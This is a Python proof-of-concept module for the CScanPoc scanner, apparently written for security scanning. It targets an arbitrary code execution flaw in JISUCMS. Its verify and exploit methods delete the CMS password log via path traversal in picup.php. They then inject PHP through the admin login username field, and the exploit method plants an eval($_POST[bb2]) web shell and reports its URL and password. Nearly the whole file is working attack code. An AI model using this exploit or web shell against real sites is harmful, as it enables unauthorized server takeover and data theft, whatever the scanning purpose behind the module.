# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'JISUCMS_0101' # 平台漏洞编号，留空
    name = '台州市极速网络CMS /data/log/passlog.php 任意代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-03-08'  # 漏洞公布时间
    desc = '''
    厂商：http://www.90576.com/  台州市极速网络有限公司，
    台州市极速网络CMS /data/log/passlog.php 任意代码执行漏洞。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-085633
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JISUCMS(台州市极速网络CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '23e2bcac-035b-4ffc-a7c0-3dc96cd2ca1d' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            url = self.target
            # del passlog
            del_url = '%s/picup.php?action=del&pic=../data/log/passlog.php' % url
            requests.get(del_url)

            login_url = '%s/login.php?action=login&lonadmin=1' % url
            login_data = {'loginuser': '<?php echo(md5(0));phpinfo();?>','loginpass':'0'}
            
            requests.post(login_url, data=login_data)
            # return page
            verify_url = '%s/data/log/passlog.php' % url
            content = requests.get(verify_url).content
            if 'cfcd208495d565ef66e7dff9f98764da' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            url = self.target
            # del passlog
            del_url = '%s/picup.php?action=del&pic=../data/log/passlog.php' % url
            requests.get(del_url)
            login_url = '%s/login.php?action=login&lonadmin=1' % url
            login_data = {'loginuser': '<?php echo(md5(0));eval($_POST[bb2]);?>','loginpass':'0'}
            
            requests.post(login_url, data=login_data)
            # return page
            webshell = '%s/data/log/passlog.php' % url
            content = requests.get(webshell).content
            if 'cfcd208495d565ef66e7dff9f98764da' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;webshell={webshell},passwd=bb2'.format(
                            target=self.target, name=self.vuln.name,webshell=webshell))
                
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

if __name__ == '__main__':
    Poc().run()